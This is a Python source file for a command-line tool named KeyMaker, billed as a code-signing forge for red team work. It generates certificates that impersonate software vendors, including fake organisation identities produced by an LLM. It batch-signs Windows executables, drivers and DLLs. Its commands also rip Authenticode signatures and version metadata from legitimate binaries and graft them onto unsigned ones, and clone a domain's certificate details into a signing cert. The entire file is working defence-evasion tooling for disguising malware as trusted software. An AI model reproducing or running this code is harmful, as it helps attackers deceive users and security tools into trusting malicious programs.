"""KeyMaker CLI — code-signing forge for authorized red team engagements."""

from __future__ import annotations

import argparse
import random
import sys
from pathlib import Path

from keymaker import cert, sign, steal, vendors
from keymaker.steal import graft_with_meta as _graft_with_meta
from keymaker.steal import read_meta as _read_meta
from keymaker.ui import bold, cyan, dim, err, heading, info, ok, table, warn

# Default store: ~/.keymaker/certs/
DEFAULT_STORE = Path.home() / ".keymaker" / "certs"


def _store(args) -> Path:
    p = Path(getattr(args, "store", None) or DEFAULT_STORE)
    p.mkdir(parents=True, exist_ok=True)
    return p


# ── gen ───────────────────────────────────────────────────────────────────────


def cmd_gen(args) -> int:
    store = _store(args)

    # Remember whether the caller passed an explicit --cn / --org / --unit so
    # LLM auto-enrichment never overwrites deliberate user choices.
    _explicit_cn = bool(getattr(args, "cn", None))
    _explicit_org = bool(getattr(args, "org", None))
    _explicit_unit = bool(getattr(args, "unit", None))

    # auto-detect provider when --llm not given
    if not getattr(args, "llm", None):
        try:
            import os as _os
            import sys as _sys

            _sys.path.insert(0, _os.path.expanduser("~/maldev"))
            from lib.llm_transport import auto_detect_provider as _adp

            _detected = _adp()
            if _detected:
                args.llm = _detected
        except Exception:
            pass
    # LLM profile enrichment — only fills fields not provided explicitly
    if getattr(args, "llm", None):
        import random as _random

        from keymaker.llm import LLMProvider, llm_org_identity

        _rng = _random.Random()
        industry = getattr(args, "industry", None) or ""
        profile_mapped = False

        # industry-specific path: richer identity (L, ST) when --industry is set
        if industry:
            raw = llm_org_identity(args.llm, industry, args.country or "FR", _rng)
            if raw:
                if raw.get("CN") and not _explicit_cn:
                    args.cn = raw["CN"]
                if raw.get("O") and not _explicit_org:
                    args.org = raw["O"]
                if raw.get("OU") and not _explicit_unit:
                    args.unit = raw["OU"]
                if raw.get("C"):
                    args.country = raw["C"][:2].upper()
                if raw.get("emailAddress"):
                    args.email = raw["emailAddress"]
                setattr(args, "_loc", raw.get("L", ""))
                setattr(args, "_st", raw.get("ST", ""))
                profile_mapped = True
                print(
                    f"[keymaker] LLM industry profile: {raw.get('O', '?')} / "
                    f"{raw.get('OU', '?')} ({industry})",
                    file=sys.stderr,
                )

        # generic path (original behaviour): context-based cert profile
        if not profile_mapped:
            _llm = LLMProvider(args.llm)
            context = (
                getattr(args, "llm_context", None)
                or industry
                or args.pool
                or "enterprise software"
            )
            profile = _llm.generate_cert_profile(context, _rng)
            if profile:
                if profile.get("cn") and not _explicit_cn:
                    args.cn = profile["cn"]
                if profile.get("org") and not _explicit_org:
                    args.org = profile["org"]
                if profile.get("unit") and not _explicit_unit:
                    args.unit = profile["unit"]
                if profile.get("country"):
                    args.country = profile["country"][:2].upper()
                if profile.get("email"):
                    args.email = profile["email"]
                print(
                    f"[keymaker] LLM profile: {profile.get('org', '?')} / {profile.get('unit', '?')}",
                    file=sys.stderr,
                )
            else:
                print("[keymaker] LLM unavailable, using static pools", file=sys.stderr)

    # resolve vendor name
    if args.cn:
        cn = args.cn
    else:
        pool_name = args.pool or "enterprise"
        pool = vendors.POOLS.get(pool_name, vendors.ENTERPRISE)
        cn = random.choice(pool)

    # build DN — include OU/L/ST when available (set by --unit/--industry LLM)
    country = args.country or "US"
    org = args.org or cn
    unit = getattr(args, "unit", None) or ""
    dn_parts = [f"CN={cn}", f"O={org}"]
    if unit:
        dn_parts.append(f"OU={unit}")
    loc = getattr(args, "_loc", "") or ""
    st = getattr(args, "_st", "") or ""
    if loc:
        dn_parts.append(f"L={loc}")
    if st:
        dn_parts.append(f"ST={st}")
    dn_parts.append(f"C={country}")
    dn = ",".join(dn_parts)

    # randomise parameters unless fixed
    rng = random.SystemRandom()
    days = args.days or rng.randint(365, 365 * 4)
    bits = args.bits or rng.choice([2048, 3072, 4096])
    digest = args.digest or rng.choice(["sha256", "sha384", "sha512"])

    # derive a stable filename from the CN (slug)
    slug = cn.lower().replace(" ", "_").replace(",", "").replace(".", "")[:32]
    pfx_path = store / f"{slug}.pfx"
    pfx_pass = args.password or ""

    print(heading("KeyMaker — cert generation"))
    print(info(f"Subject     : {bold(cn)}"))
    if unit:
        print(info(f"Unit        : {dim(unit)}"))
    print(info(f"DN          : {dim(dn)}"))
    print(info(f"RSA bits    : {bits}"))
    print(info(f"Validity    : {days} days"))
    print(info(f"Digest      : {digest}"))
    print(info(f"Output      : {pfx_path}"))
    print()

    try:
        cert.gen_cert(
            subject=dn,
            days=days,
            key_bits=bits,
            out_pfx=pfx_path,
            pfx_pass=pfx_pass,
            digest=digest,
        )
        print(ok(f"Certificate written → {pfx_path}"))
        if pfx_pass:
            print(info(f"PFX password: {cyan(pfx_pass)}"))
        print(info("Sign a binary: keymaker sign <file> --cert " + slug))
    except Exception as e:
        print(err(str(e)), file=sys.stderr)
        return 1
    return 0


# ── import ────────────────────────────────────────────────────────────────────


def cmd_import(args) -> int:
    store = _store(args)
    src = Path(args.pfx)
    if not src.exists():
        print(err(f"file not found: {src}"), file=sys.stderr)
        return 1
    dst = store / src.name
    try:
        cert.import_pfx(src, dst, pfx_pass=args.password or "")
        print(ok(f"Imported → {dst}"))
    except Exception as e:
        print(err(str(e)), file=sys.stderr)
        return 1
    return 0


# ── list ──────────────────────────────────────────────────────────────────────


def cmd_list(args) -> int:
    store = _store(args)
    certs = cert.list_certs(store)
    if not certs:
        print(warn(f"no certificates in {store}"))
        print(info("create one: keymaker gen"))
        return 0
    print(heading(f"Keystore  ({store})"))
    print()
    rows = [[c["file"], c.get("subject", "?"), c.get("expires", "?")] for c in certs]
    print(table(["FILE", "SUBJECT", "EXPIRES"], rows))
    return 0


# ── sign ──────────────────────────────────────────────────────────────────────


def _resolve_pfx(args, store: Path) -> tuple[Path, str]:
    """Resolve --cert to a .pfx path and its password."""
    pfx_pass = args.password or ""
    if args.cert:
        # could be a filename, slug, or full path
        p = Path(args.cert)
        if p.suffix != ".pfx":
            p = p.with_suffix(".pfx")
        if not p.is_absolute():
            p = store / p
        if not p.exists():
            raise FileNotFoundError(f"certificate not found: {p}")
        return p, pfx_pass
    # no --cert: pick most recently modified pfx in store
    pfxs = sorted(store.glob("*.pfx"), key=lambda f: f.stat().st_mtime, reverse=True)
    if not pfxs:
        raise FileNotFoundError(f"no certificates in {store} — run: keymaker gen")
    return pfxs[0], pfx_pass


def _sign_one(target: Path, pfx: Path, pfx_pass: str, args) -> bool:
    digest = args.digest or random.choice(["sha256", "sha384", "sha512"])
    ts = getattr(args, "timestamp_srv", None)
    no_ts = getattr(args, "no_timestamp", False)
    desc = getattr(args, "description", "") or ""
    url = getattr(args, "url", "") or ""
    try:
        sign.sign_pe(
            target=target,
            pfx=pfx,
            pfx_pass=pfx_pass,
            digest=digest,
            timestamp_srv=ts,
            no_timestamp=no_ts,
            description=desc,
            url=url,
        )
        return True
    except Exception as e:
        print(err(f"{target.name}: {e}"), file=sys.stderr)
        return False


def cmd_sign(args) -> int:
    store = _store(args)
    try:
        pfx, pfx_pass = _resolve_pfx(args, store)
    except FileNotFoundError as e:
        print(err(str(e)), file=sys.stderr)
        return 1

    info_cert = cert._cert_info(pfx, pfx_pass)
    print(heading("KeyMaker — signing"))
    print(
        info(
            f"Certificate : {bold(info_cert.get('subject', pfx.name) if info_cert else pfx.name)}"
        )
    )
    print(info(f"PFX         : {dim(str(pfx))}"))
    print()

    targets = [Path(f) for f in args.files]
    ok_count = 0
    for t in targets:
        if not t.exists():
            print(err(f"not found: {t}"))
            continue
        if _sign_one(t, pfx, pfx_pass, args):
            ok_count += 1
            result = sign.verify_pe(t)
            status = "signed" if result["signed"] else "SIGN_FAILED"
            print(
                ok(f"{t.name}  →  {status}")
                if result["signed"]
                else err(f"{t.name}  →  {status}")
            )

    print()
    print(info(f"{ok_count}/{len(targets)} binaries signed"))
    return 0 if ok_count == len(targets) else 1


# ── batch ─────────────────────────────────────────────────────────────────────


def cmd_batch(args) -> int:
    store = _store(args)
    try:
        pfx, pfx_pass = _resolve_pfx(args, store)
    except FileNotFoundError as e:
        print(err(str(e)), file=sys.stderr)
        return 1

    # find PE files in directory
    scan_dir = Path(args.dir)
    exts = {".exe", ".dll", ".sys"}
    if args.ext:
        exts = {e if e.startswith(".") else "." + e for e in args.ext.split(",")}
    recurse = getattr(args, "recurse", False)
    glob = "**/*" if recurse else "*"
    targets = [
        f for f in scan_dir.glob(glob) if f.suffix.lower() in exts and f.is_file()
    ]

    if not targets:
        print(warn(f"no PE files found in {scan_dir}"))
        return 0

    info_cert = cert._cert_info(pfx, pfx_pass)
    print(heading(f"KeyMaker — batch sign  ({len(targets)} files)"))
    print(
        info(
            f"Certificate : {bold(info_cert.get('subject', pfx.name) if info_cert else pfx.name)}"
        )
    )
    print(info(f"Directory   : {scan_dir}"))
    print()

    ok_count = sum(_sign_one(t, pfx, pfx_pass, args) for t in targets)
    print()
    print(info(f"{ok_count}/{len(targets)} signed"))
    return 0 if ok_count == len(targets) else 1


# ── steal ─────────────────────────────────────────────────────────────────────


def cmd_steal(args) -> int:
    op = getattr(args, "steal_op", None)
    if not op:
        print("usage: keymaker steal <rip|graft|remove|check> ...")
        return 0

    if op == "check":
        for path in args.files:
            t = Path(path)
            if not t.exists():
                print(err(f"not found: {t}"))
                continue
            signed = steal.check(t)
            print(
                (ok if signed else warn)(
                    f"{t.name}  →  {'signed (cert present)' if signed else 'unsigned'}"
                )
            )
        return 0

    if op == "rip":
        t = Path(args.file)
        if not t.exists():
            print(err(f"not found: {t}"), file=sys.stderr)
            return 1
        try:
            out = steal.rip(t, Path(args.output) if args.output else None)
            print(ok(f"Signature ripped → {out}"))
            print(info(f"Size: {out.stat().st_size} bytes"))
        except Exception as e:
            print(err(str(e)), file=sys.stderr)
            return 1
        return 0

    if op == "graft":
        out_p = Path(args.output) if args.output else None
        with_meta = getattr(args, "with_meta", False)
        try:
            if with_meta and not args.sig:
                out, meta_ok = _graft_with_meta(
                    Path(args.source), Path(args.target), out_p
                )
                print(ok(f"Signature grafted → {out}"))
                if meta_ok:
                    print(
                        ok(
                            "VS_VERSION_INFO overwritten (CompanyName, ProductName, FileVersion...)"
                        )
                    )
                else:
                    print(
                        warn(
                            "VS_VERSION_INFO skipped (source block larger than target or not found)"
                        )
                    )
            elif args.sig:
                out = steal.graft_sig(Path(args.sig), Path(args.target), out_p)
                print(ok(f"Signature grafted → {out}"))
            else:
                out = steal.graft(Path(args.source), Path(args.target), out_p)
                print(ok(f"Signature grafted → {out}"))
            print(
                warn(
                    "Hash mismatch — Authenticode validation will fail; presence/CA checks pass"
                )
            )
        except Exception as e:
            print(err(str(e)), file=sys.stderr)
            return 1
        return 0

    if op == "meta":
        for path in args.files:
            t = Path(path)
            if not t.exists():
                print(err(f"not found: {t}"))
                continue
            fields = _read_meta(t)
            if not fields:
                print(warn(f"{t.name}: no VS_VERSION_INFO found"))
                continue
            print(info(bold(t.name)))
            for k, v in fields.items():
                print(f"  {dim(k+':'): <26} {v}")
        return 0

    if op == "remove":
        t = Path(args.file)
        if not t.exists():
            print(err(f"not found: {t}"), file=sys.stderr)
            return 1
        try:
            out = steal.remove(t, Path(args.output) if args.output else None)
            print(ok(f"Signature removed → {out}"))
        except Exception as e:
            print(err(str(e)), file=sys.stderr)
            return 1
        return 0

    print(err(f"unknown steal op: {op}"), file=sys.stderr)
    return 1


# ── clone ─────────────────────────────────────────────────────────────────────


def cmd_clone(args) -> int:
    store = _store(args)
    slug = args.out or args.domain.replace(".", "_").replace("-", "_")[:32]
    pfx_path = store / f"{slug}.pfx"
    pfx_pass = args.password or ""

    print(heading("KeyMaker — domain cert clone"))
    print(info(f"Domain      : {bold(args.domain)}"))
    print(info(f"Output      : {pfx_path}"))
    print()

    try:
        meta = cert.clone_cert(
            domain=args.domain,
            out_pfx=pfx_path,
            pfx_pass=pfx_pass,
            key_bits=args.bits or 2048,
            digest=args.digest or "sha256",
        )
        print(ok(f"Cloned certificate written → {pfx_path}"))
        print(info(f"Subject     : {meta['subject']}"))
        print(info(f"NotBefore   : {meta['not_before']}"))
        print(info(f"NotAfter    : {meta['not_after']}"))
        print(info(f"Validity    : {meta['days']} days"))
        if pfx_pass:
            print(info(f"PFX password: {cyan(pfx_pass)}"))
    except Exception as e:
        print(err(str(e)), file=sys.stderr)
        return 1

    if args.sign:
        print()
        target = Path(args.sign)
        if not target.exists():
            print(err(f"sign target not found: {target}"), file=sys.stderr)
            return 1
        try:
            sign.sign_pe(target=target, pfx=pfx_path, pfx_pass=pfx_pass)
            result = sign.verify_pe(target)
            print(
                ok(f"{target.name}  →  signed")
                if result["signed"]
                else err(f"{target.name}  →  sign failed")
            )
        except Exception as e:
            print(err(str(e)), file=sys.stderr)
            return 1

    return 0


# ── verify ────────────────────────────────────────────────────────────────────


def cmd_verify(args) -> int:
    failed = 0
    for path in args.files:
        t = Path(path)
        if not t.exists():
            print(err(f"not found: {t}"))
            failed += 1
            continue
        result = sign.verify_pe(t)
        if result["signed"]:
            print(ok(f"{t.name}"))
        else:
            print(err(f"{t.name}  (not signed or invalid)"))
            failed += 1
    return 1 if failed else 0


# ── vendors ───────────────────────────────────────────────────────────────────


def cmd_vendors(args) -> int:
    pool_name = args.pool or "all"
    pool = vendors.POOLS.get(pool_name, vendors.ALL)
    print(heading(f"Vendor pool: {pool_name}  ({len(pool)} entries)"))
    print()
    for name in sorted(pool):
        print(f"  {name}")
    return 0


# ── parser ────────────────────────────────────────────────────────────────────


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="keymaker",
        description="Code-signing forge for authorized red team engagements.",
    )
    p.add_argument(
        "--store",
        metavar="DIR",
        help=f"certificate store directory (default: {DEFAULT_STORE})",
    )
    sub = p.add_subparsers(dest="cmd", metavar="<command>")

    # gen
    g = sub.add_parser("gen", help="generate a self-signed code-signing certificate")
    g.add_argument(
        "--cn", metavar="NAME", help="certificate common name (default: random vendor)"
    )
    g.add_argument(
        "--org", metavar="ORG", help="organisation field (default: same as CN)"
    )
    g.add_argument("--unit", metavar="OU", help="organisational unit (OU) field")
    g.add_argument("--country", metavar="CC", help="country code (default: US)")
    g.add_argument(
        "--pool",
        choices=list(vendors.POOLS),
        default="enterprise",
        help="vendor pool to draw from (default: enterprise)",
    )
    g.add_argument(
        "--days", type=int, help="validity in days (default: random 1–4 years)"
    )
    g.add_argument(
        "--bits",
        type=int,
        choices=[2048, 3072, 4096],
        help="RSA key size (default: random)",
    )
    g.add_argument(
        "--digest",
        choices=["sha256", "sha384", "sha512"],
        help="hash algorithm (default: random)",
    )
    g.add_argument("--password", metavar="PASS", help="PFX password (default: none)")
    g.add_argument(
        "--llm",
        default="",
        metavar="SPEC",
        help="generate coherent cert fields via LLM. SPEC: ollama | ollama:MODEL | deepseek | anthropic | openai.",
    )
    g.add_argument(
        "--llm-context",
        default="",
        metavar="DESC",
        help="context for LLM cert field generation (e.g. 'French banking sector'). Used with --llm.",
    )
    g.add_argument(
        "--industry",
        default="",
        metavar="SECTOR",
        help="industry sector for LLM org identity. Used with --llm. "
        "Values: healthcare|finance|retail|manufacturing|telecom|energy|legal|education.",
    )

    # import
    i = sub.add_parser(
        "import", help="import an existing .pfx certificate into the store"
    )
    i.add_argument("pfx", help="path to .pfx file")
    i.add_argument("--password", metavar="PASS", help="PFX password (default: none)")

    # list
    sub.add_parser("list", help="list certificates in the store")

    # sign
    s = sub.add_parser("sign", help="sign one or more PE files")
    s.add_argument("files", nargs="+", help="PE files to sign (.exe/.dll/.sys)")
    s.add_argument(
        "--cert",
        metavar="SLUG|FILE",
        help="certificate slug or .pfx path (default: newest in store)",
    )
    s.add_argument("--password", metavar="PASS", help="PFX password")
    s.add_argument(
        "--digest",
        choices=["sha256", "sha384", "sha512"],
        help="hash algorithm (default: random per file)",
    )
    s.add_argument("--description", metavar="TEXT", help="program description field")
    s.add_argument("--url", metavar="URL", help="publisher URL field")
    s.add_argument("--timestamp-srv", metavar="URL", help="RFC-3161 timestamp server")
    s.add_argument("--no-timestamp", action="store_true", help="skip timestamping")

    # batch
    b = sub.add_parser("batch", help="sign all PE files in a directory")
    b.add_argument("dir", help="directory to scan")
    b.add_argument("--cert", metavar="SLUG|FILE", help="certificate to use")
    b.add_argument("--password", metavar="PASS")
    b.add_argument(
        "--ext",
        metavar="EXTS",
        default=".exe,.dll,.sys",
        help="comma-separated extensions (default: .exe,.dll,.sys)",
    )
    b.add_argument(
        "--recurse", "-r", action="store_true", help="recurse into subdirectories"
    )
    b.add_argument("--digest", choices=["sha256", "sha384", "sha512"])
    b.add_argument("--description", metavar="TEXT")
    b.add_argument("--url", metavar="URL")
    b.add_argument("--no-timestamp", action="store_true")

    # steal
    st = sub.add_parser(
        "steal", help="PE Authenticode signature theft (rip/graft/remove/check)"
    )
    st_sub = st.add_subparsers(dest="steal_op", metavar="<op>")

    st_rip = st_sub.add_parser(
        "rip", help="rip cert blob from a signed PE to .sig file"
    )
    st_rip.add_argument("file", help="signed PE to rip from")
    st_rip.add_argument(
        "-o", "--output", metavar="FILE", help="output .sig path (default: <file>.sig)"
    )

    st_graft = st_sub.add_parser("graft", help="graft a cert blob onto a target PE")
    st_graft.add_argument(
        "--source", metavar="SIGNED_PE", help="signed PE to copy cert from"
    )
    st_graft.add_argument("--sig", metavar="SIG_FILE", help="pre-ripped .sig file")
    st_graft.add_argument("target", help="unsigned PE to graft onto")
    st_graft.add_argument("-o", "--output", metavar="FILE", help="output PE path")
    st_graft.add_argument(
        "--with-meta",
        action="store_true",
        help="also overwrite VS_VERSION_INFO (CompanyName/ProductName/FileVersion) from source",
    )

    st_rem = st_sub.add_parser("remove", help="remove Authenticode signature from a PE")
    st_rem.add_argument("file", help="signed PE")
    st_rem.add_argument(
        "-o", "--output", metavar="FILE", help="output path (default: <file>_nosig)"
    )

    st_chk = st_sub.add_parser(
        "check", help="check if PE has a cert table pointer (presence only)"
    )
    st_chk.add_argument("files", nargs="+", help="PE files to check")

    st_meta = st_sub.add_parser(
        "meta",
        help="read VS_VERSION_INFO fields from a PE (CompanyName, ProductName...)",
    )
    st_meta.add_argument("files", nargs="+", help="PE files to inspect")

    # clone
    cl = sub.add_parser(
        "clone",
        help="clone a domain's TLS cert metadata into a self-signed code-signing cert",
    )
    cl.add_argument("domain", help="target domain (e.g. microsoft.com)")
    cl.add_argument(
        "--out", metavar="SLUG", help="cert store alias (default: derived from domain)"
    )
    cl.add_argument("--password", metavar="PASS", help="PFX password (default: none)")
    cl.add_argument(
        "--bits",
        type=int,
        choices=[2048, 3072, 4096],
        help="RSA key size (default: 2048)",
    )
    cl.add_argument(
        "--digest",
        choices=["sha256", "sha384", "sha512"],
        help="hash algorithm (default: sha256)",
    )
    cl.add_argument(
        "--sign", metavar="PE_FILE", help="sign this PE immediately after cloning"
    )

    # verify
    v = sub.add_parser("verify", help="verify Authenticode signature on PE files")
    v.add_argument("files", nargs="+")

    # vendors
    vd = sub.add_parser("vendors", help="list vendor name pool")
    vd.add_argument(
        "--pool", choices=list(vendors.POOLS), help="pool to list (default: all)"
    )

    return p


def main(argv=None) -> int:
    p = build_parser()
    args = p.parse_args(argv)
    if not args.cmd:
        p.print_help()
        return 0
    dispatch = {
        "gen": cmd_gen,
        "import": cmd_import,
        "list": cmd_list,
        "sign": cmd_sign,
        "batch": cmd_batch,
        "steal": cmd_steal,
        "clone": cmd_clone,
        "verify": cmd_verify,
        "vendors": cmd_vendors,
    }
    return dispatch[args.cmd](args)
